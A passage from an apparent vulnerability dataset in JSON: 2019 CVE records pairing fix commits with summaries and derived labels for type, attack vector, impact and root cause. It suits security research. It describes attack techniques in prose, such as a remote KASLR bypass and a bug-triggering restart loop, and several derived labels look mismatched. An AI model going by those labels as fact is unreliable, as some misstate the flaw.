in mpeg4_decode_studio_block ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted mpeg - 4 video data","Impact":"cause a denial of service ( out - of - array access ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-arrary access flaw","Attack Type":"remote attacker"},{"commit_id":"54655623a82632e7624714d7b2a3e039dc5faa7e","cve_id":"CVE-2019-11338","cwe_id":"CWE-476","commit_message":"avcodec\/hevcdec: Avoid only partly skiping duplicate first slices\n\nFixes: NULL pointer dereference and out of array access\nFixes: 13871\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_HEVC_fuzzer-5746167087890432\nFixes: 13845\/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_HEVC_fuzzer-5650370728034304\n\nThis also fixes the return code for explode mode\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/projects\/ffmpeg\nReviewed-by: James Almer <jamrial@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavcodec\/hevcdec.c in FFmpeg 4.1.2 mishandles detection of duplicate first slices, which allows remote attackers to cause a denial of service (NULL pointer dereference and out-of-array access) or possibly have unspecified other impact via crafted HEVC data.","commit_message_1":"avoid only partly skiping duplicate first slice this also fix the return code for explode mode","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via crafted hevc data","Impact":"cause a denial of service ( pointer dereference and out - of - array access ) or possibly have unspecified other impact","Root Cause":"caused by improper handling of the detection of duplicate first slices","Attack Type":"remote attacker"},{"commit_id":"f36525c5beafb78959c3a07d6622c9028de348da","cve_id":"CVE-2019-11222","cwe_id":"CWE-119","commit_message":"fix buffer overrun in gf_bin128_parse\n\ncloses #1204\ncloses #1205","summary":"gf_bin128_parse in utils\/os_divers.c in GPAC 0.7.1 has a buffer overflow issue for the crypt feature when encountering a crafted_drm_file.xml file.","commit_message_1":"fix buffer overrun in gf_bin128_parse","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a buffer overflow issue for the crypt feature when encountering a crafted _ drm _ file . xml file","Attack Type":"remote attacker"},{"commit_id":"32120d5b8b3203fc21ccb9eafb0eaf824bb59354","cve_id":"CVE-2019-11072","cwe_id":"CWE-190","commit_message":"[core] fix abort in http-parseopts (fixes #2945)\n\nfix abort in server.http-parseopts with url-path-2f-decode enabled\n\n(thx stze)\n\nx-ref:\n  \"Security - SIGABRT during GET request handling with url-path-2f-decode enabled\"\n  https:\/\/redmine.lighttpd.net\/issues\/2945","summary":"** DISPUTED ** lighttpd before 1.4.54 has a signed integer overflow, which might allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a malicious HTTP GET request, as demonstrated by mishandling of \/%2F? in burl_normalize_2F_to_slash_fix in burl.c. NOTE: The developer states *The feature which can be abused to cause the crash is a new feature in lighttpd 1.4.50, and is not enabled by default. It must be explicitly configured in the config file (e.g. lighttpd.conf). Certain input will trigger an abort() in lighttpd when that feature is enabled. lighttpd detects the underflow or realloc() will fail (in both 32-bit and 64-bit executables), also detected in lighttpd. Either triggers an explicit abort() by lighttpd. This is not exploitable beyond triggering the explicit abort() with subsequent application exit.*","commit_message_1":"fix abort in http-parseopts ( fix # <number> ) fix abort in <file>-parseopts with url-path-2f-decode enabled ( thx stze ) x-ref : `` security - sigabrt during get request handling with url-path-2f-decode enabled '' http : \/\/<file>","Vulnerability Type":"integer overflow","Attack Vector":"via a malicious http get request , as demonstrated by mishandling of \/ % 2f ? in burl _ normalize _ 2f _ to _ slash _ fix in burl . c","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by a signed integer overflow","Attack Type":"remote attacker"},{"commit_id":"2119afbe74ee0c914c1d5c4c859c594c08b0ad42","cve_id":"CVE-2019-10678","cwe_id":"CWE-93","commit_message":"Do not allow enters\/returns in arguments (thanks to Fabio Carretto)","summary":"Domoticz before 4.10579 neglects to categorize n and r as insecure argument options.","commit_message_1":"do not allow enters\/returns in argument ( thanks to fabio carretto )","Vulnerability Type":"CRLF Injection","Attack Vector":"by improper handling of insecure argument options","Impact":"launch further attacks on the system","Root Cause":"caused by improper handling of insecure argument options","Attack Type":"remote attacker"},{"commit_id":"d39a171e9c6a1c44dbdf43f9db6c3fbd887e38c1","cve_id":"CVE-2019-10672","cwe_id":"CWE-20","commit_message":"Fixed security issue 1","summary":"treeRead in hdf\/btree.c in libmysofa before 0.7 does not properly validate multiplications and additions.","commit_message_1":"fixed security issue <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"treeRead in hdf\/btree.c in libmysofa before 0.7","Impact":"launch further attacks on the system","Root Cause":"does not properly validate multiplications and additions","Attack Type":"remote attacker"},{"commit_id":"ee70db46f81afa582c96b887b73bcd2a86feda00","cve_id":"CVE-2019-10664","cwe_id":"CWE-89","commit_message":"Fixed possible SQL Injection Vulnerability (Thanks to Fabio Carretto!)","summary":"Domoticz before 4.10578 allows SQL Injection via the idx parameter in CWebServer::GetFloorplanImage in WebServer.cpp.","commit_message_1":"fixed possible sql injection vulnerability ( thanks to fabio carretto ! )","Vulnerability Type":"sql injection","Attack Vector":"via the idx parameter in CWebServer::GetFloorplanImage in WebServer.cpp","Impact":"view, add, modify or delete information in the back-end database","Root Cause":"send specially-crafted SQL statements to the WebServer.php script using the idx parameter","Attack Type":"remote attacker"},{"commit_id":"355b98553789b646ed97ad801a619ff898471b92","cve_id":"CVE-2019-10639","cwe_id":"CWE-200","commit_message":"netns: provide pure entropy for net_hash_mix()\n\nnet_hash_mix() currently uses kernel address of a struct net,\nand is used in many places that could be used to reveal this\naddress to a patient attacker, thus defeating KASLR, for\nthe typical case (initial net namespace, &init_net is\nnot dynamically allocated)\n\nI believe the original implementation tried to avoid spending\ntoo many cycles in this function, but security comes first.\n\nAlso provide entropy regardless of CONFIG_NET_NS.\n\nFixes: 0b4419162aa6 (\"netns: introduce the net_hash_mix \"salt\" for hashes\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Amit Klein <aksecurity@gmail.com>\nReported-by: Benny Pinkas <benny@pinkas.net>\nCc: Pavel Emelyanov <xemul@openvz.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Linux kernel 4.x (starting from 4.1) and 5.x before 5.0.8 allows Information Exposure (partial kernel address disclosure), leading to a KASLR bypass. Specifically, it is possible to extract the KASLR kernel image offset using the IP ID values the kernel produces for connection-less protocols (e.g., UDP and ICMP). When such traffic is sent to multiple destination IP addresses, it is possible to obtain hash collisions (of indices to the counter array) and thereby obtain the hashing key (via enumeration). This key contains enough bits from a kernel address (of a static variable) so when the key is extracted (via enumeration), the offset of the kernel image is exposed. This attack can be carried out remotely, by the attacker forcing the target device to send UDP or ICMP (or certain other) traffic to attacker-controlled IP addresses. Forcing a server to send UDP traffic is trivial if the server is a DNS server. ICMP traffic is trivial if the server answers ICMP Echo requests (ping). For client targets, if the target visits the attacker's web page, then WebRTC or gQUIC can be used to force UDP traffic to attacker-controlled IP addresses. NOTE: this attack against KASLR became viable in 4.1 because IP ID generation was changed to have a dependency on an address associated with a network namespace.","commit_message_1":"provide pure entropy for net_hash_mix ( ) net_hash_mix ( ) currently us kernel address of a struct net , and is used in many place that could be used to reveal this address to a patient attacker , thus defeating kaslr , for the typical case ( initial net namespace , & init_net is not dynamically allocated ) i believe the original implementation tried to avoid spending too many cycle in this function , but security come first","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sniffing the network","Impact":"obtain sensitive information","Root Cause":"caused by the use of a weak function to generate IP packet IDs","Attack Type":"remote attacker"},{"commit_id":"df453700e8d81b1bdafdf684365ee2b9431fb702","cve_id":"CVE-2019-10638","cwe_id":"CWE-200","commit_message":"inet: switch IP ID generator to siphash\n\nAccording to Amit Klein and Benny Pinkas, IP ID generation is too weak\nand might be used by attackers.\n\nEven with recent net_hash_mix() fix (netns: provide pure entropy for net_hash_mix())\nhaving 64bit key and Jenkins hash is risky.\n\nIt is time to switch to siphash and its 128bit keys.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Amit Klein <aksecurity@gmail.com>\nReported-by: Benny Pinkas <benny@pinkas.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 5.1.7, a device can be tracked by an attacker using the IP ID values the kernel produces for connection-less protocols (e.g., UDP and ICMP). When such traffic is sent to multiple destination IP addresses, it is possible to obtain hash collisions (of indices to the counter array) and thereby obtain the hashing key (via enumeration). An attack may be conducted by hosting a crafted web page that uses WebRTC or gQUIC to force UDP traffic to attacker-controlled IP addresses.","commit_message_1":"switch ip id generator to siphash according to amit klein and benny pinkas , ip id generation is too weak and might be used by attacker","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By persuading a victim to visit a specially crafted Web site","Impact":"obtain sensitive information","Root Cause":"caused by the use of IP ID values for connection-less protocols","Attack Type":"remote attacker"},{"commit_id":"64613bc8b6b4adf1e32231f9844d99cd512b8973","cve_id":"CVE-2019-9917","cwe_id":"CWE-20","commit_message":"Don't crash if user specified invalid encoding.\n\nThis is CVE-2019-9917","summary":"ZNC before 1.7.3-rc1 allows an existing remote user to cause a Denial of Service (crash) via invalid encoding.","commit_message_1":"do n't crash if user specified invalid encoding","Vulnerability Type":"Improper Input Validation","Attack Vector":"via invalid encoding","Impact":"cause a denial of service ( crash )","Root Cause":"cause by specifying invalid encoding","Attack Type":"remote attacker"},{"commit_id":"e4bb58cc8b6202a421e65f8230217d8ae6e16eb5","cve_id":"CVE-2019-9578","cwe_id":"CWE-119","commit_message":"fix filling out of initresp","summary":"In devs.c in Yubico libu2f-host before 1.1.8, the response to init is misparsed, leaking uninitialized stack memory back to the device.","commit_message_1":"fix filling out of initresp","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an issue with misparsing response to init","Attack Type":"remote attacker"},{"commit_id":"0a1d52994d440e21def1c2174932410b4f2a98a1","cve_id":"CVE-2019-9213","cwe_id":"CWE-476","commit_message":"mm: enforce min addr even if capable() in expand_downwards()\n\nsecurity_mmap_addr() does a capability check with current_cred(), but\nwe can reach this code from contexts like a VFS write handler where\ncurrent_cred() must not be used.\n\nThis can be abused on systems without SMAP to make NULL pointer\ndereferences exploitable again.\n\nFixes: 8869477a49c3 (\"security: protect from stack expansion into low vm addresses\")\nCc: stable@kernel.org\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In the Linux kernel before 4.20.14, expand_downwards in mm\/mmap.c lacks a check for the mmap minimum address, which makes it easier for attackers to exploit kernel NULL pointer dereferences on non-SMAP platforms. This is related to a capability check for the wrong task.","commit_message_1":"enforce min addr even if capable ( ) in expand_downwards ( ) security_mmap_addr ( ) doe a capability check with current_cred ( ) , but we can reach this code from context like a vfs write handler where current_cred ( ) must not be used","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By executing a specially-crafted program","Impact":"cause a denial of service","Root Cause":"lacks a check for the mmap minimum address","Attack Type":"local attacker"},{"commit_id":"c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc","cve_id":"CVE-2019-9162","cwe_id":"CWE-129","commit_message":"netfilter: nf_nat_snmp_basic: add missing length checks in ASN.1 cbs\n\nThe generic ASN.1 decoder infrastructure doesn't guarantee that callbacks\nwill get as much data as they expect; callbacks have to check the `datalen`\nparameter before looking at `data`. Make sure that snmp_version() and\nsnmp_helper() don't read\/write beyond the end of the packet data.\n\n(Also move the assignment to `pdata` down below the check to make it clear\nthat it isn't necessarily a pointer we can use before the `datalen` check.)\n\nFixes: cc2d58634e0f (\"netfilter: nf_nat_snmp_basic: use asn1 decoder library\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"In the Linux kernel before 4.20.12, net\/ipv4\/netfilter\/nf_nat_snmp_basic_main.c in the SNMP NAT module has insufficient ASN.1 length checks (aka an array index error), making out-of-bounds read and write operations possible, leading to an OOPS or local privilege escalation. This affects snmp_version and snmp_helper.","commit_message_1":"nf_nat_snmp_basic : add missing length check in <file> cbs the generic <file> decoder infrastructure doe n't guarantee that callback will get a much data a they expect ; callback have to check the ` datalen ` parameter before looking at ` data `","Vulnerability Type":"Improper Validation of Array Index","Attack Vector":"By setting up new network namespaces with an iptables configuration that invokes SNMP translation","Impact":"cause kernel OOPS or local privilege escalation","Root Cause":"module has insufficient asn . 1 length checks ( aka an array index error ) , making out - of - bounds read and write operations possible , leading to an oops or local privilege escalation","Attack Type":"attacker"},{"commit_id":"77f8269606bf95fcb232ee86f6da80886f1dfae8","cve_id":"CVE-2019-9003","cwe_id":"CWE-416","commit_message":"ipmi: fix use-after-free of user->release_barrier.rda\n\nWhen we do the following test, we got oops in ipmi_msghandler driver\nwhile((1))\ndo\n\tservice ipmievd restart & service ipmievd restart\ndone\n\n---------------------------------------------------------------\n[  294.230186] Unable to handle kernel paging request at virtual address 0000803fea6ea008\n[  294.230188] Mem abort info:\n[  294.230190]   ESR = 0x96000004\n[  294.230191]   Exception class = DABT (current EL), IL = 32 bits\n[  294.230193]   SET = 0, FnV = 0\n[  294.230194]   EA = 0, S1PTW = 0\n[  294.230195] Data abort info:\n[  294.230196]   ISV = 0, ISS = 0x00000004\n[  294.230197]   CM = 0, WnR = 0\n[  294.230199] user pgtable: 4k pages, 48-bit VAs, pgdp = 00000000a1c1b75a\n[  294.230201] [0000803fea6ea008] pgd=0000000000000000\n[  294.230204] Internal error: Oops: 96000004 [#1] SMP\n[  294.235211] Modules linked in: nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm iw_cm dm_mirror dm_region_hash dm_log dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ghash_ce sha2_ce ses sha256_arm64 sha1_ce hibmc_drm hisi_sas_v2_hw enclosure sg hisi_sas_main sbsa_gwdt ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe ipmi_si mdio hns_dsaf ipmi_devintf ipmi_msghandler hns_enet_drv hns_mdio\n[  294.277745] CPU: 3 PID: 0 Comm: swapper\/3 Kdump: loaded Not tainted 5.0.0-rc2+ #113\n[  294.285511] Hardware name: Huawei TaiShan 2280 \/BC11SPCD, BIOS 1.37 11\/21\/2017\n[  294.292835] pstate: 80000005 (Nzcv daif -PAN -UAO)\n[  294.297695] pc : __srcu_read_lock+0x38\/0x58\n[  294.301940] lr : acquire_ipmi_user+0x2c\/0x70 [ipmi_msghandler]\n[  294.307853] sp : ffff00001001bc80\n[  294.311208] x29: ffff00001001bc80 x28: ffff0000117e5000\n[  294.316594] x27: 0000000000000000 x26: dead000000000100\n[  294.321980] x25: dead000000000200 x24: ffff803f6bd06800\n[  294.327366] x23: 0000000000000000 x22: 0000000000000000\n[  294.332752] x21: ffff00001001bd04 x20: ffff80df33d19018\n[  294.338137] x19: ffff80df33d19018 x18: 0000000000000000\n[  294.343523] x17: 0000000000000000 x16: 0000000000000000\n[  294.348908] x15: 0000000000000000 x14: 0000000000000002\n[  294.354293] x13: 0000000000000000 x12: 0000000000000000\n[  294.359679] x11: 0000000000000000 x10: 0000000000100000\n[  294.365065] x9 : 0000000000000000 x8 : 0000000000000004\n[  294.370451] x7 : 0000000000000000 x6 : ffff80df34558678\n[  294.375836] x5 : 000000000000000c x4 : 0000000000000000\n[  294.381221] x3 : 0000000000000001 x2 : 0000803fea6ea000\n[  294.386607] x1 : 0000803fea6ea008 x0 : 0000000000000001\n[  294.391994] Process swapper\/3 (pid: 0, stack limit = 0x0000000083087293)\n[  294.398791] Call trace:\n[  294.401266]  __srcu_read_lock+0x38\/0x58\n[  294.405154]  acquire_ipmi_user+0x2c\/0x70 [ipmi_msghandler]\n[  294.410716]  deliver_response+0x80\/0xf8 [ipmi_msghandler]\n[  294.416189]  deliver_local_response+0x28\/0x68 [ipmi_msghandler]\n[  294.422193]  handle_one_recv_msg+0x158\/0xcf8 [ipmi_msghandler]\n[  294.432050]  handle_new_recv_msgs+0xc0\/0x210 [ipmi_msghandler]\n[  294.441984]  smi_recv_tasklet+0x8c\/0x158 [ipmi_msghandler]\n[  294.451618]  tasklet_action_common.isra.5+0x88\/0x138\n[  294.460661]  tasklet_action+0x2c\/0x38\n[  294.468191]  __do_softirq+0x120\/0x2f8\n[  294.475561]  irq_exit+0x134\/0x140\n[  294.482445]  __handle_domain_irq+0x6c\/0xc0\n[  294.489954]  gic_handle_irq+0xb8\/0x178\n[  294.497037]  el1_irq+0xb0\/0x140\n[  294.503381]  arch_cpu_idle+0x34\/0x1a8\n[  294.510096]  do_idle+0x1d4\/0x290\n[  294.516322]  cpu_startup_entry+0x28\/0x30\n[  294.523230]  secondary_start_kernel+0x184\/0x1d0\n[  294.530657] Code: d538d082 d2800023 8b010c81 8b020021 (c85f7c25)\n[  294.539746] ---[ end trace 8a7a880dee570b29 ]---\n[  294.547341] Kernel panic - not syncing: Fatal exception in interrupt\n[  294.556837] SMP: stopping secondary CPUs\n[  294.563996] Kernel Offset: disabled\n[  294.570515] CPU features: 0x002,21006008\n[  294.577638] Memory Limit: none\n[  294.587178] Starting crashdump kernel...\n[  294.594314] Bye!\n\nBecause the user->release_barrier.rda is freed in ipmi_destroy_user(), but\nthe refcount is not zero, when acquire_ipmi_user() uses user->release_barrier.rda\nin __srcu_read_lock(), it causes oops.\nFix this by calling cleanup_srcu_struct() when the refcount is zero.\n\nFixes: e86ee2d44b44 (\"ipmi: Rework locking and shutdown for hot remove\")\nCc: stable@vger.kernel.org # 4.18\nSigned-off-by: Yang Yingliang <yangyingliang@huawei.com>\n\nSigned-off-by: Corey Minyard <cminyard@mvista.com>","summary":"In the Linux kernel before 4.20.5, attackers can trigger a drivers\/char\/ipmi\/ipmi_msghandler.c use-after-free and OOPS by arranging for certain simultaneous execution of the code, as demonstrated by a *service ipmievd restart* loop.","commit_message_1":"fix use-after-free of user- > <file> when we do the following test , we got oops in ipmi_msghandler driver while ( ( <number> ) ) do service ipmievd restart & service ipmievd restart done -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - [ <file> ] unable to handle kernel paging request at virtual address 0000803fea6ea008 [ <file> ] mem abort info : [ <file> ] esr = 0x96000004 [ <file> ] exception class = dabt ( current el ) , il = <number> bit [ <file> ] set = <number> , fnv = <number> [ <file> ] ea = <number> , s1ptw = <number> [ <file> ] data abort info : [ <file> ] isv = <number> , i = 0x00000004 [ <file> ] cm = <number> , wnr = <number> [ <file> ] user pgtable : 4k page , <number>-bit va , pgdp = 00000000a1c1b75a [ <file> ] [ 0000803fea6ea008 ] pgd=<number> [ <file> ] internal error : oops : <number> [ # <number> ] smp [ <file> ] module linked in : nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm iw_cm dm_mirror dm_region_hash dm_log dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ghash_ce sha2_ce s sha256_arm64 sha1_ce hibmc_drm hisi_sas_v2_hw enclosure sg hisi_sas_main sbsa_gwdt ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe ipmi_si mdio hns_dsaf ipmi_devintf ipmi_msghandler hns_enet_drv hns_mdio [ <file> ] cpu : <number> pid : <number> comm : swapper\/<number> kdump : loaded not tainted <file>","Vulnerability Type":"Use After Free","Attack Vector":"By executing a specially-crafted program","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free and kernel OOPs","Attack Type":"local attacker"},{"commit_id":"2858eaf99f6cc5aae129bcbf1e24ad160240185f","cve_id":"CVE-2019-8906","cwe_id":"CWE-125","commit_message":"Avoid OOB read (found by ASAN reported by F. Alonso)","summary":"do_core_note in readelf.c in libmagic.a in file 5.35 has an out-of-bounds read because memcpy is misused.","commit_message_1":"avoid oob read ( found by asan reported by f","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"local attacker"},{"commit_id":"ed8fdce754a5d8d14c09e989d8877707bd43906f","cve_id":"CVE-2019-8460","cwe_id":"CWE-20","commit_message":"Received SACK options are managed by a linked list at the TCP socket.\nThere is a global tunable limit net.inet.tcp.sackholelimit, default\nis 32768.  If an attacker manages to attach all these sack holes\nto a few TCP connections, the lists may grow long.  Traversing them\nmight cause higher CPU consumption on the victim machine.  In\npractice such a situation is hard to create as the TCP retransmit\nand 2*msl timer flush the list periodically.  For additional\nprotection, enforce a per connection limit of 128 SACK holes in the\nlist.\nreported by Reuven Plevinsky and Tal Vainshtein\ndiscussed with claudio@ and procter@; OK deraadt@","summary":"Reuven Plevinsky and Tal Vainshtein of Check Point Software Technologies Ltd. discovered that OpenBSD kernel (all versions, including 6.5) can be forced to create long chains of TCP SACK holes that cause very expensive calls to tcp_sack_option() for every incoming SACK packet which can lead to a denial of service.","commit_message_1":"received sack option are managed by a linked list at the tcp socket","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending specially-crafted SACK packets","Impact":"cause a denial of service","Root Cause":"forced to create long chains of tcp sack holes","Attack Type":"remote attacker"},{"commit_id":"306c1f0fa5754ca78efd16ab752f0e981d4f6b82","cve_id":"CVE-2019-7397","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1454","summary":"In ImageMagick before 7.0.8-25 and GraphicsMagick through 1.3.31, several memory leaks exist in WritePDFImage in coders\/pdf.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by memory leaks","Attack Type":"remote attacker"},{"commit_id":"748a03651e5b138bcaf160d15133de2f4b1b89ce","cve_id":"CVE-2019-7396","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1452","summary":"In ImageMagick before 7.0.8-25, a memory leak exists in ReadSIXELImage in coders\/sixel.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"8a43abefb38c5e29138e1c9c515b313363541c06","cve_id":"CVE-2019-7395","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1451","summary":"In ImageMagick before 7.0.8-25, a memory leak exists in WritePSDChannel in coders\/psd.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"d3bd7413e0ca40b60cf60d4003246d067cafdeda","cve_id":"CVE-2019-7308","cwe_id":"CWE-189","commit_message":"bpf: fix sanitation of alu op with pointer \/ scalar type from different paths\n\nWhile 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer\narithmetic\") took care of rejecting alu op on pointer when e.g. pointer\ncame from two different map values with different map properties such as\nvalue size, Jann reported that a case was not covered yet when a given\nalu op is used in both \"ptr_reg += reg\" and \"numeric_reg += reg\" from\ndifferent branches where we would incorrectly try to sanitize based\non the pointer's limit. Catch this corner case and reject the program\ninstead.\n\nFixes: 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer arithmetic\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>","summary":"kernel\/bpf\/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.","commit_message_1":"fix sanitation of alu op with pointer \/ scalar type from different path while 979d63d50c0c ( `` bpf : prevent out of bound speculation on pointer arithmetic '' ) took care of rejecting alu op on pointer when <file>","Vulnerability Type":"Numeric Errors","Attack Vector":"cases of different branches with different state or limits to sanitize","Impact":"bypass security restrictions","Root Cause":"caused by an out-of-bounds access speculation on pointer arithmetic","Attack Type":"local attacker"},{"commit_id":"1e6a3ace073c9ec9c71e439c111d23c6e66cb6ae","cve_id":"CVE-2019-7175","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1450","summary":"In ImageMagick before 7.0.8-25, some memory leaks exist in DecodeImage in coders\/pcd.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by memory leaks","Attack Type":"remote attacker"},{"commit_id":"089f7c0bc28d399b0420aa6ef058e4c1c120b2ae","cve_id":"CVE-2019-6978","cwe_id":"CWE-415","commit_message":"Sync with upstream\n\nEven though libgd\/libgd#492 is not a relevant bug fix for PHP, since\nthe binding doesn't use the `gdImage*Ptr()` functions at all, we're\nporting the fix to stay in sync here.","summary":"The GD Graphics Library (aka LibGD) 2.2.5 has a double free in the gdImage*Ptr() functions in gd_gif_out.c, gd_jpeg.c, and gd_wbmp.c. NOTE: PHP is unaffected.","commit_message_1":"sync with upstream even though libgd\/libgd # <number> is not a relevant bug fix for php , since the binding doe n't use the ` gdimage * ptr ( ) ` function at all , we're porting the fix to stay in sync here","Vulnerability Type":"double free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"remote attacker"},{"commit_id":"00622428bda8d7521db8d74260b519fa41d69d0a","cve_id":"CVE-2019-6976","cwe_id":"CWE-200","commit_message":"zero memory on malloc\n\nto prevent write of uninit memory under some error conditions\n\nthanks Balint","summary":"libvips before 8.7.4 generates output images from uninitialized memory locations when processing corrupted input image data because iofuncs\/memory.c does not zero out allocated memory. This can result in leaking raw process memory contents through the output image.","commit_message_1":"zero memory on malloc","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"generates output images from uninitialized memory locations when processing corrupted input image data because iofuncs\/memory.c","Impact":"launch further attacks on the system","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"cfa39381173d5f969daf43582c95ad679189cbc9","cve_id":"CVE-2019-6974","cwe_id":"CWE-362","commit_message":"kvm: fix kvm_ioctl_create_device() reference counting (CVE-2019-6974)\n\nkvm_ioctl_create_device() does the following:\n\n1. creates a device that holds a reference to the VM object (with a borrowed\n   reference, the VM's refcount has not been bumped yet)\n2. initializes the device\n3. transfers the reference to the device to the caller's file descriptor table\n4. calls kvm_get_kvm() to turn the borrowed reference to the VM into a real\n   reference\n\nThe ownership transfer in step 3 must not happen before the reference to the VM\nbecomes a proper, non-borrowed reference, which only happens in step 4.\nAfter step 3, an attacker can close the file descriptor and drop the borrowed\nreference, which can cause the refcount of the kvm object to drop to zero.\n\nThis means that we need to grab a reference for the device before\nanon_inode_getfd(), otherwise the VM can disappear from under us.\n\nFixes: 852b6d57dc7f (\"kvm: add device control API\")\nCc: stable@kernel.org\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"In the Linux kernel before 4.20.8, kvm_ioctl_create_device in virt\/kvm\/kvm_main.c mishandles reference counting because of a race condition, leading to a use-after-free.","commit_message_1":"fix kvm_ioctl_create_device ( ) reference counting ( <cve_id> ) kvm_ioctl_create_device ( ) doe the following : <number>","Vulnerability Type":"Race Condition","Attack Vector":"none","Impact":"cause a denial of service ","Root Cause":"caused by the improper handling of reference counting by kvm_ioctl_create_device","Attack Type":"local attacker"},{"commit_id":"574823bfab82d9d8fa47f422778043fbb4b4f50e","cve_id":"CVE-2019-5489","cwe_id":"CWE-200","commit_message":"Change mincore() to count \"mapped\" pages rather than \"cached\" pages\n\nThe semantics of what \"in core\" means for the mincore() system call are\nsomewhat unclear, but Linux has always (since 2.3.52, which is when\nmincore() was initially done) treated it as \"page is available in page\ncache\" rather than \"page is mapped in the mapping\".\n\nThe problem with that traditional semantic is that it exposes a lot of\nsystem cache state that it really probably shouldn't, and that users\nshouldn't really even care about.\n\nSo let's try to avoid that information leak by simply changing the\nsemantics to be that mincore() counts actual mapped pages, not pages\nthat might be cheaply mapped if they were faulted (note the \"might be\"\npart of the old semantics: being in the cache doesn't actually guarantee\nthat you can access them without IO anyway, since things like network\nfilesystems may have to revalidate the cache before use).\n\nIn many ways the old semantics were somewhat insane even aside from the\ninformation leak issue.  From the very beginning (and that beginning is\na long time ago: 2.3.52 was released in March 2000, I think), the code\nhad a comment saying\n\n  Later we can get more picky about what \"in core\" means precisely.\n\nand this is that \"later\".  Admittedly it is much later than is really\ncomfortable.\n\nNOTE! This is a real semantic change, and it is for example known to\nchange the output of \"fincore\", since that program literally does a\nmmmap without populating it, and then doing \"mincore()\" on that mapping\nthat doesn't actually have any pages in it.\n\nI'm hoping that nobody actually has any workflow that cares, and the\ninfo leak is real.\n\nWe may have to do something different if it turns out that people have\nvalid reasons to want the old semantics, and if we can limit the\ninformation leak sanely.\n\nCc: Kevin Easton <kevin@guarana.org>\nCc: Jiri Kosina <jikos@kernel.org>\nCc: Masatake YAMATO <yamato@redhat.com>\nCc: Andrew Morton 